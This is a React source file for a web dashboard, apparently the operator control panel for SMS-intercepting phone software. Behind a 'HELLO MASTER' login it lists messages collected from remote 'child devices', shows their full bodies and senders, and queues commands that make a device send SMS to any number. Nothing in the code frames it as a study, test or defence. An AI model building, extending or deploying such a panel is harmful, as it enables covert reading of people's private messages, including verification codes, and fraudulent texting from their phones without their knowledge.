import { useState, useEffect } from 'react'
import { supabase } from './lib/supabase'
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom'

interface Message {
  id: string
  from: string
  to: string
  body: string
  timestamp: string
  type: string
  device_id: string
}

interface Device {
  device_id: string
  messageCount: number
  lastSeen: string
}

// ==================== RED DEMON BACKGROUND ====================
function RedDemonBackground() {
  return (
    <div className="fixed inset-0 z-[-1] pointer-events-none overflow-hidden bg-[#0f0f0f]">
      {/* Red Demon Face Background */}
      <div className="absolute bottom-[-100px] right-[-120px] w-[600px] h-[600px] opacity-20">
        <svg viewBox="0 0 200 200" className="w-full h-full">
          {/* Demon Head */}
          <ellipse cx="100" cy="105" rx="65" ry="70" fill="#b91c1c" />
          
          {/* Horns */}
          <path d="M55 55 Q35 25 50 5" fill="none" stroke="#7f1d1d" strokeWidth="14" strokeLinecap="round" />
          <path d="M145 55 Q165 25 150 5" fill="none" stroke="#7f1d1d" strokeWidth="14" strokeLinecap="round" />
          
          {/* Left Eye */}
          <ellipse cx="68" cy="90" rx="16" ry="20" fill="#450a0a" />
          <circle cx="68" cy="90" r="9" fill="#ef4444" />
          <circle cx="68" cy="90" r="4" fill="#ffffff" />
          
          {/* Right Eye */}
          <ellipse cx="132" cy="90" rx="16" ry="20" fill="#450a0a" />
          <circle cx="132" cy="90" r="9" fill="#ef4444" />
          <circle cx="132" cy="90" r="4" fill="#ffffff" />
          
          {/* Evil Eyebrows */}
          <path d="M52 72 Q68 62 84 72" fill="none" stroke="#450a0a" strokeWidth="4" strokeLinecap="round" />
          <path d="M116 72 Q132 62 148 72" fill="none" stroke="#450a0a" strokeWidth="4" strokeLinecap="round" />
          
          {/* Mouth */}
          <path d="M75 125 Q100 145 125 125" fill="none" stroke="#450a0a" strokeWidth="5" strokeLinecap="round" />
          
          {/* Nose */}
          <path d="M95 105 Q100 115 105 105" fill="none" stroke="#450a0a" strokeWidth="3" />
        </svg>
      </div>
    </div>
  )
}

// ==================== LOGIN PAGE ====================
function LoginPage() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    const { error } = await supabase.auth.signInWithPassword({
      email,
      password,
    })

    if (error) {
      setError(error.message)
    }
    setLoading(false)
  }

  return (
    <div className="min-h-screen bg-[#0f0f0f] flex items-center justify-center p-4 relative">
      <RedDemonBackground />
      
      <div className="bg-[#1a1a1a] p-8 rounded-2xl w-full max-w-md border border-gray-800">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-red-700 rounded-2xl mx-auto flex items-center justify-center mb-4">
            <span className="text-white text-4xl">🛡️</span>
          </div>
          <h1 className="text-3xl font-bold text-white">HELLO MASTER👹</h1>
          <p className="text-gray-400 mt-2">ENTER DASHBOARD</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">Email</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3 bg-[#111111] border border-gray-700 rounded-xl text-white focus:outline-none focus:border-red-600"
              placeholder=""
              required
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-300 mb-2">Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 bg-[#111111] border border-gray-700 rounded-xl text-white focus:outline-none focus:border-red-600"
              placeholder="••••••••"
              required
            />
          </div>

          {error && (
            <div className="text-red-400 text-sm bg-red-950 p-3 rounded-xl border border-red-900">
              {error}
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 bg-red-700 text-white rounded-xl font-medium hover:bg-red-800 disabled:bg-red-900"
          >
            {loading ? 'Signing in...' : 'Sign In'}
          </button>
        </form>

        
      </div>
    </div>
  )
}

// ==================== MAIN DASHBOARD ====================
function Dashboard() {
  const [activeTab, setActiveTab] = useState<'messages' | 'devices'>('messages')
  const [messages, setMessages] = useState<Message[]>([])
  const [devices, setDevices] = useState<Device[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [userEmail, setUserEmail] = useState('')

  const [showSendModal, setShowSendModal] = useState(false)
  const [selectedDevice, setSelectedDevice] = useState('')
  const [phoneNumber, setPhoneNumber] = useState('')
  const [smsBody, setSmsBody] = useState('')
  const [sending, setSending] = useState(false)
  const [sendSuccess, setSendSuccess] = useState(false)

  const [showDeviceMessagesModal, setShowDeviceMessagesModal] = useState(false)
  const [selectedDeviceForModal, setSelectedDeviceForModal] = useState('')
  const [deviceMessages, setDeviceMessages] = useState<Message[]>([])

  useEffect(() => {
    const getUser = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      if (user) setUserEmail(user.email || '')
    }
    getUser()
  }, [])

  useEffect(() => {
    const fetchData = async () => {
      setLoading(true)
      const { data, error } = await supabase
        .from('sms_history')
        .select('*')
        .order('timestamp', { ascending: false })

      if (!error && data) {
        setMessages(data)

        const deviceMap = new Map<string, { count: number; lastSeen: string }>()
        data.forEach((msg: Message) => {
          if (!deviceMap.has(msg.device_id)) {
            deviceMap.set(msg.device_id, { count: 0, lastSeen: msg.timestamp })
          }
          const current = deviceMap.get(msg.device_id)!
          current.count += 1
          if (msg.timestamp > current.lastSeen) current.lastSeen = msg.timestamp
        })

        const deviceList: Device[] = Array.from(deviceMap.entries()).map(([device_id, stats]) => ({
          device_id,
          messageCount: stats.count,
          lastSeen: stats.lastSeen
        }))
        setDevices(deviceList)
      }
      setLoading(false)
    }

    fetchData()
  }, [])

  const sortedMessages = [...messages].sort((a, b) => 
    new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  )

  const filteredMessages = sortedMessages.filter(msg =>
    msg.body.toLowerCase().includes(searchTerm.toLowerCase()) ||
    msg.from.toLowerCase().includes(searchTerm.toLowerCase())
  )

  const openDeviceMessages = (deviceId: string) => {
    const filtered = messages
      .filter(msg => msg.device_id === deviceId)
      .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
    
    setDeviceMessages(filtered)
    setSelectedDeviceForModal(deviceId)
    setShowDeviceMessagesModal(true)
  }

  const handleSendSMS = async () => {
    if (!smsBody.trim()) return
    setSending(true)

    const targetNumber = phoneNumber.trim() || selectedDevice

    const { error } = await supabase.from('commands').insert({
      device_id: selectedDevice || 'all',
      command: 'send',
      to_number: targetNumber,
      body: smsBody.trim(),
      created_at: new Date().toISOString()
    })

    if (error) {
      alert('Failed to send SMS: ' + error.message)
    } else {
      setSendSuccess(true)
      setTimeout(() => {
        setShowSendModal(false)
        setSendSuccess(false)
        setSmsBody('')
        setPhoneNumber('')
        setSelectedDevice('')
        alert('✅ SMS command sent!')
      }, 1500)
    }
    setSending(false)
  }

  const handleLogout = async () => {
    await supabase.auth.signOut()
  }

  return (
    <div className="flex flex-col md:flex-row h-screen bg-[#0f0f0f] text-white">
      <RedDemonBackground />

      {/* Sidebar */}
      <div className="md:w-72 bg-[#1a1a1a] border-b md:border-r border-gray-800">
        <div className="p-4 md:p-6">
          <div className="flex items-center gap-3 mb-8">
            <div className="w-10 h-10 bg-red-700 rounded-xl flex items-center justify-center">
              <span className="text-white text-2xl">🛡️</span>
            </div>
            <div>
              <h1 className="font-bold text-xl">Master 👹👺 </h1>
              <p className="text-xs text-gray-400">Device Dashboard</p>
            </div>
          </div>

          <nav className="space-y-1">
            <button
              onClick={() => setActiveTab('messages')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl text-left transition-all ${
                activeTab === 'messages' ? 'bg-red-900/50 text-red-400 font-medium' : 'hover:bg-[#111111] text-gray-300'
              }`}
            >
              <span>💬</span>
              <span>All Messages ({messages.length})</span>
            </button>

            <button
              onClick={() => setActiveTab('devices')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl text-left transition-all ${
                activeTab === 'devices' ? 'bg-red-900/50 text-red-400 font-medium' : 'hover:bg-[#111111] text-gray-300'
              }`}
            >
              <span>📱</span>
              <span>Devices ({devices.length})</span>
            </button>
          </nav>

          <div className="mt-8 pt-6 border-t border-gray-800">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gray-700 rounded-full"></div>
                <div>
                  <p className="text-sm font-medium truncate max-w-[140px]">{userEmail}</p>
                </div>
              </div>
              <button 
                onClick={handleLogout}
                className="text-red-400 text-sm hover:text-red-500"
              >
                Logout
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        <div className="h-16 bg-[#1a1a1a] border-b border-gray-800 px-4 md:px-8 flex items-center justify-between">
          <div>
            <h2 className="text-xl font-semibold">
              {activeTab === 'messages' ? 'All Messages' : 'Child Devices'}
            </h2>
          </div>

          <div className="flex items-center gap-3">
            {activeTab === 'messages' && (
              <input
                type="text"
                placeholder="Search..."
                className="px-4 py-2 bg-[#111111] border border-gray-700 rounded-xl text-sm w-48 md:w-72 text-white"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            )}
            
            <button 
              onClick={() => setShowSendModal(true)}
              className="px-4 py-2 bg-red-700 text-white rounded-xl text-sm font-medium hover:bg-red-800 flex items-center gap-2"
            >
              ✉️ <span className="hidden md:inline">Send SMS</span>
            </button>

            {/* ========== NEW REFRESH BUTTON ========== */}
            <button 
              onClick={() => window.location.reload()}
              className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-xl text-sm font-medium flex items-center gap-2 transition-colors"
              title="Refresh page"
            >
              🔄 <span className="hidden md:inline">Refresh</span>
            </button>
          </div>
        </div>

        <div className="flex-1 p-4 md:p-8 overflow-auto">
          {activeTab === 'messages' ? (
            loading ? (
              <div className="flex justify-center items-center h-64">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
              </div>
            ) : filteredMessages.length > 0 ? (
              <div className="space-y-4">
                {filteredMessages.map((msg) => (
                  <div key={msg.id} className="bg-[#1a1a1a] p-5 md:p-6 rounded-2xl border border-gray-800">
                    <div className="flex flex-col md:flex-row md:justify-between gap-2 mb-3">
                      <div className="font-semibold break-all">{msg.from} → {msg.to}</div>
                      <div className="text-xs text-right">
                        <span className="px-3 py-1 bg-gray-800 rounded-full">{msg.type}</span>
                        <div className="text-gray-500 mt-1">{new Date(msg.timestamp).toLocaleString()}</div>
                      </div>
                    </div>
                    <p className="text-gray-300 break-words">{msg.body}</p>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-16">
                <div className="text-6xl mb-4">📭</div>
                <h3 className="text-xl font-semibold">No messages found</h3>
              </div>
            )
          ) : (
            loading ? (
              <div className="flex justify-center items-center h-64">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
              </div>
            ) : devices.length > 0 ? (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6">
                {devices.map((device, index) => (
                  <div key={index} className="bg-[#1a1a1a] p-5 md:p-6 rounded-2xl border border-gray-800">
                    <div className="flex items-center gap-4 mb-4">
                      <div className="w-11 h-11 bg-red-900/50 rounded-xl flex items-center justify-center text-2xl">📱</div>
                      <div className="min-w-0 flex-1">
                        <h3 className="font-semibold">Child Device</h3>
                        <p className="text-xs text-gray-500 font-mono truncate">{device.device_id}</p>
                      </div>
                    </div>

                    <div className="space-y-2 text-sm mb-4">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Messages</span>
                        <span className="font-semibold">{device.messageCount}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Last Active</span>
                        <span>{new Date(device.lastSeen).toLocaleDateString()}</span>
                      </div>
                    </div>

                    <button 
                      onClick={() => openDeviceMessages(device.device_id)}
                      className="w-full py-2.5 bg-red-700 text-white rounded-xl text-sm font-medium hover:bg-red-800"
                    >
                      View Device SMS
                    </button>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-16">
                <div className="text-6xl mb-4">📱</div>
                <h3 className="text-xl font-semibold">No devices found</h3>
              </div>
            )
          )}
        </div>
      </div>

      {/* Send SMS Modal */}
      {showSendModal && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1a1a1a] rounded-2xl w-full max-w-md p-6 md:p-8 border border-gray-700">
            <h2 className="text-2xl font-bold mb-6">Send SMS to Child</h2>

            {sendSuccess ? (
              <div className="text-center py-8">
                <div className="text-6xl mb-4">✅</div>
                <h3 className="text-xl font-semibold text-green-400">Command Sent!</h3>
              </div>
            ) : (
              <>
                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-300 mb-2">Choose Device</label>
                  <select value={selectedDevice} onChange={(e) => setSelectedDevice(e.target.value)} className="w-full bg-[#111111] border border-gray-700 rounded-xl px-4 py-3 text-white">
                    <option value="">Select a device...</option>
                    {devices.map((device, index) => (
                      <option key={index} value={device.device_id}>
                        {device.device_id} ({device.messageCount} messages)
                      </option>
                    ))}
                  </select>
                </div>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-300 mb-2">Or enter phone number</label>
                  <input type="text" placeholder="+234XXXXXXXXXX" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} className="w-full bg-[#111111] border border-gray-700 rounded-xl px-4 py-3 text-white" />
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-300 mb-2">Message</label>
                  <textarea placeholder="Type your message..." value={smsBody} onChange={(e) => setSmsBody(e.target.value)} rows={4} className="w-full bg-[#111111] border border-gray-700 rounded-xl px-4 py-3 resize-none text-white" />
                </div>

                <div className="flex gap-3">
                  <button onClick={() => setShowSendModal(false)} className="flex-1 py-3 border border-gray-700 rounded-xl font-medium">Cancel</button>
                  <button onClick={handleSendSMS} disabled={sending || !smsBody.trim()} className="flex-1 py-3 bg-red-700 text-white rounded-xl font-medium disabled:bg-red-900">
                    {sending ? 'Sending...' : 'Send SMS'}
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Device Messages Modal */}
      {showDeviceMessagesModal && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1a1a1a] rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col border border-gray-700">
            <div className="p-6 border-b border-gray-700 flex justify-between items-center">
              <div>
                <h2 className="text-2xl font-bold">Device Messages</h2>
                <p className="text-sm text-gray-500 font-mono">{selectedDeviceForModal}</p>
              </div>
              <button onClick={() => setShowDeviceMessagesModal(false)} className="text-3xl leading-none">&times;</button>
            </div>

            <div className="flex-1 overflow-auto p-6 space-y-4">
              {deviceMessages.length > 0 ? (
                deviceMessages.map((msg) => (
                  <div key={msg.id} className="bg-[#111111] p-4 rounded-xl border border-gray-800">
                    <div className="flex justify-between text-sm mb-2">
                      <span className="font-medium">{msg.from} → {msg.to}</span>
                      <span className="text-gray-500 text-xs">{new Date(msg.timestamp).toLocaleString()}</span>
                    </div>
                    <p className="text-gray-300 break-words">{msg.body}</p>
                  </div>
                ))
              ) : (
                <div className="text-center py-12">
                  <div className="text-5xl mb-4">📭</div>
                  <p className="text-gray-400">No messages from this device</p>
                </div>
              )}
            </div>

            <div className="p-6 border-t border-gray-700">
              <button 
                onClick={() => setShowDeviceMessagesModal(false)}
                className="w-full py-3 bg-gray-800 rounded-xl font-medium hover:bg-gray-700"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// ==================== MAIN APP WITH ROUTING ====================
function App() {
  const [session, setSession] = useState<any>(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session)
      setLoading(false)
    })

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session)
    })

    return () => subscription.unsubscribe()
  }, [])

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0f0f0f]">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
      </div>
    )
  }

  return (
    <Router>
      <Routes>
        <Route 
          path="/" 
          element={session ? <Dashboard /> : <Navigate to="/login" />} 
        />
        <Route 
          path="/login" 
          element={!session ? <LoginPage /> : <Navigate to="/" />} 
        />
      </Routes>
    </Router>
  )
}

export default App